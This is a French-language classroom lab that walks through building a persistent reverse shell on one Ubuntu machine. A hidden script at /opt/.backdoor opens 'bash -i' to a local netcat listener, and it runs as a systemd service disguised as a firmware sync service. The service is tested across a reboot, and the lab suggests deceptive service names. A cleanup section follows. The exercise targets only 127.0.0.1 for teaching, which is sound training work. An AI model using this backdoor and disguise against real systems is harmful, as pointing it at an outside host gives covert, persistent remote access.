
#  TP avec **UNE SEULE MACHINE Ubuntu 22.04**








## Objectif

* Simuler un **reverse shell** avec un service systemd
* Utiliser **une seule machine Ubuntu 22.04**
* Ouvrir le listener (`nc -lvnp`) **localement**
* Prouver que le service fonctionne et persiste **même après redémarrage**

---

## 1. SCHÉMA DE TRAVAIL (SANS RÉSEAU EXTERNE)

```
+----------------------------------------+
|   MACHINE UBUNTU 22.04 UNIQUE          |
|                                        |
|  Terminal 1 :                          |
|     nc -lvnp 4444                      |
|                                        |
|  Terminal 2 (root) :                   |
|     systemd --> bash reverse vers 127.0.0.1:4444  |
+----------------------------------------+
```

---

## 2. ÉTAPES COMPLÈTES

---

### 2.1 Terminal 1 – Ouvrir le port localement (port 4444)

```bash
nc -lvnp 4444
```

Attendre. Ne rien fermer.

---

### 2.2 Terminal 2 – Créer le script malveillant

```bash
sudo mkdir -p /opt/.backdoor
sudo nano /opt/.backdoor/reverse.sh
```

Contenu du script :

```bash
#!/bin/bash
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

Enregistrez. Puis :

```bash
sudo chmod +x /opt/.backdoor/reverse.sh
```

---

### 2.3 Créer le faux service systemd

```bash
sudo nano /etc/systemd/system/systemd-firmware.service
```

Contenu :

```ini
[Unit]
Description=Firmware Sync Service
After=network.target

[Service]
ExecStart=/opt/.backdoor/reverse.sh
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

---

### 2.4 Activer le service

```bash
sudo systemctl daemon-reload
sudo systemctl enable systemd-firmware
sudo systemctl start systemd-firmware
```

---

### 2.5 Observer le reverse shell (Terminal 1)

Si tout fonctionne, vous verrez :

```
Connection from 127.0.0.1
bash-5.1$
```

Vous êtes dans un shell **ouvert sur vous-même**, preuve que le service marche.

---

### 2.6 Reboot et test de persistance

```bash
sudo reboot
```

Une fois la machine redémarrée, ouvrez rapidement un terminal et tapez :

```bash
nc -lvnp 4444
```

Le shell réapparaît quelques secondes plus tard.
Le service s’est relancé **automatiquement**.

---

## 3. Nettoyage

```bash
sudo systemctl stop systemd-firmware
sudo systemctl disable systemd-firmware
sudo rm /etc/systemd/system/systemd-firmware.service
sudo rm -rf /opt/.backdoor/
sudo systemctl daemon-reload
```

---

## 4. Remarques pédagogiques

* **Pas besoin de réseau**, ni d’IP publique
* Parfait pour **TP local en salle** ou **autoformation**
* C’est un exemple de **persistence locale**
* Les étudiants **voient directement les effets** du service systemd
* Le nom du service peut être **déguisé** (`systemd-firmware`, `dbus-monitor`, etc.)

